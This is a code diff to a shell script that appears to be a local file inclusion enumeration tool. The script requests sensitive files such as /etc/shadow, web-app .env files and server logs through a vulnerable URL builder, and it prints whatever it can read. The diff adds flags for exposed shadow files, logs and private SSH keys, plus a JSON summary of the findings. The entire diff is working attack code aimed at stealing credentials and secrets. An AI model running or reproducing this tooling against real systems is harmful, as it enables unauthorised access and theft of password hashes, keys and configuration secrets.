@@ -59,6 +59,13 @@ TARGETS="/etc/shadow
 /var/www/html/.env"
 
 READABLE=""
+SHADOW_READABLE=false
+SSH_KEY_FOUND=false
+AUTH_LOG_READABLE=false
+APACHE_LOG_READABLE=false
+NGINX_LOG_READABLE=false
+USER_FILES_FOUND=false
+READABLE_LIST=""
 for f in $TARGETS; do
   clean_f=$(echo "$f" | sed 's|^/||')
   url=$(build_url "$clean_f")
@@ -70,6 +77,16 @@ for f in $TARGETS; do
     echo "$result" | head -8
     echo "---"
     READABLE="$READABLE $f"
+    READABLE_LIST="$READABLE_LIST\"$f\","
+    case "$f" in
+      */shadow|*/gshadow) SHADOW_READABLE=true ;;
+      */auth.log) AUTH_LOG_READABLE=true ;;
+      */apache*/access.log) APACHE_LOG_READABLE=true ;;
+      */nginx/access.log) NGINX_LOG_READABLE=true ;;
+    esac
+    if echo "$result" | grep -q "BEGIN.*PRIVATE KEY"; then
+      SSH_KEY_FOUND=true
+    fi
   else
     echo "[MISS] $f (${size}B)"
   fi
@@ -91,3 +108,7 @@ for user in $USERS; do
 done
 
 [ -n "$READABLE" ] && echo "LFI_ENUM_OK" || echo "LFI_ENUM_EMPTY"
+
+# ---- NDJSON structured output ----
+READABLE_LIST_CLEAN=$(echo "$READABLE_LIST" | sed 's/,$//')
+echo "{\"event\":\"lfi_files_readable\",\"payload\":{\"files\":[$READABLE_LIST_CLEAN],\"shadow_readable\":$SHADOW_READABLE,\"ssh_key_found\":$SSH_KEY_FOUND,\"auth_log_readable\":$AUTH_LOG_READABLE,\"apache_log_readable\":$APACHE_LOG_READABLE,\"nginx_log_readable\":$NGINX_LOG_READABLE}}"
